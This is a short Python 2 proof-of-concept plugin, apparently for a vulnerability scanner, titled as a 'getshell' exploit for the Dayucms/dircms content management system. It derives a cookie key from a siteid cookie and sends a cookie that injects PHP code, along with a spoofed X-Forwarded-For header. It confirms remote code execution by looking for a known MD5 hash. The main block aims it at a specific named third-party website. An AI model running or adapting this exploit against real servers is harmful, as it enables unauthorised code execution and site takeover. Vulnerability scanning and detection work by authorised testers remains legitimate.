#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Dayucms or dircms Getshell EXP
Author    : a
mail      : a@lcx.cc
Referer   : http://0day5.com/archives/3223
"""
import re
import urlparse

def assign(service, arg):
    if service == 'dircms':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    cookie_pre = None
    cookiekey = None
    payload = 'pay/order.php'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl('"%s"' % url) 
    m = re.findall(u'Set-Cookie[\s\S]+?;',head)
    if m :
        for cookie in m:
            if 'siteid' in cookie:
                cookie_pre = cookie
                cookiekey =  cookie_pre[12:-9] +'060b8081c32887f8'
                exp(cookiekey,url)
                break;

def exp(cookiekey,url):
    payload = cookiekey + ' = 1%3b@print(md5(base64_decode(MzYwd2Vic2Nhbg)))' 
    xip = 'X-Forwarded-For: 2.2.2.2'
    code, head, res, errcode, _ = curl.curl('-b "%s" -H "%s" "%s"' % (payload,xip,url))
    if 'ed1e83f8d8d90aa943e4add2ce6a4cbf' in res:
        security_hole(url)
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('dircms', 'http://www.0394zk.cn/')[1])